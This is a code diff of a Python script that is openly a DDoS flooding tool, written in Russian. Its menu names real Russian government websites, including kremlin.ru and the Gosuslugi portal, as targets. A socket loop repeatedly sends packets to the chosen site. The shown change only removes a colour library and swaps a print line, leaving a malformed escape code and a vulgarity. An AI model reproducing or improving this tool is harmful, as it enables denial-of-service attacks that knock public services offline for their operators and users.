@@ -3,8 +3,6 @@ import socket
 import sys,random
 import time
 import os
-import colorama
-from colorama import Fore, Back, Style
 
 print("1)Сайт президента РФ - kremlin.ru\n2)Правительство России официальный сайт - government.ru\n3)Госуслуги - esia.gosuslugi.ru\n4)Совет Федерации - http://council.gov.ru\n5)Testsite")
 k = input("\nВыберите сайт для DDoS-атаки: ")
@@ -39,7 +37,7 @@ if k == '1':
 			    s.send(packet)
 			    print(F+time.ctime(time.time()) + ' Send paceges->'+site+E)
 		    except socket.error:
-			    print(Fore.GREEN + 'Zalupa')
+			    print('\033[32 Zalupa')
 			    exit(1)
     def dos2():
 	    while 1:
